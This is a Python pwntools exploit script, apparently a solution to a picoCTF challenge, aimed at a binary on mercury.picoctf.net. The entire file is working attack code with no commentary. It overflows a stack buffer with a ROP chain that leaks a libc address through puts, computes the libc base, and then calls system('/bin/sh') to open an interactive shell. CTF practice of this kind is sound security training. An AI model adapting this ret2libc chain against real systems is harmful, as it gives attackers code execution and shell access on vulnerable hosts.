#!/usr/bin/env python3
from pwn import *
from pwnlib.rop.rop import Padding

context.binary = binary = './vuln'

# For address searching
vuln_elf = ELF(binary)
libc = ELF('./libc.so.6')

vuln_rop = ROP(vuln_elf)

p = remote("mercury.picoctf.net", 1774)
# p = process('./vuln')

Padding = b'A'*136


payload = Padding
payload += p64(vuln_rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(vuln_elf.got.setbuf)
payload += p64(vuln_elf.plt.puts)
payload += p64(vuln_elf.symbols.main)


# p.sendline(payload)
p.sendlineafter('VeR', payload)

p.recvuntil(b'AAAd\n')

leak = u64(p.recvline().strip().ljust(8, b'\x00'))
log.info(f"{hex(leak)=}")
libc.address = leak - libc.symbols.setbuf
log.info(f'Libc base => {hex(libc.address)}')

payload = Padding
payload += p64(vuln_rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(vuln_rop.find_gadget(['ret'])[0])
payload += p64(libc.symbols.system)


p.sendline(payload)
p.interactive()
